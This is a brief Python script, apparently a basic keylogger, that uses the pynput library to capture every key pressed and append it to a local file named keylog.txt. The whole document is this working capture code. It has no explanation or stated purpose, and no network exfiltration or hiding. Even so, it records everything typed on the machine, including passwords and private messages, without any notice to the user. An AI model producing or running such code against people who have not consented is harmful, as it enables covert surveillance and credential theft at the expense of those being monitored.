from pynput.keyboard import Key, Listener

# Define the function to write keystrokes to a file
def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key) + "\n")

# Create a listener instance
with Listener(on_press=on_press) as listener:
    listener.join()
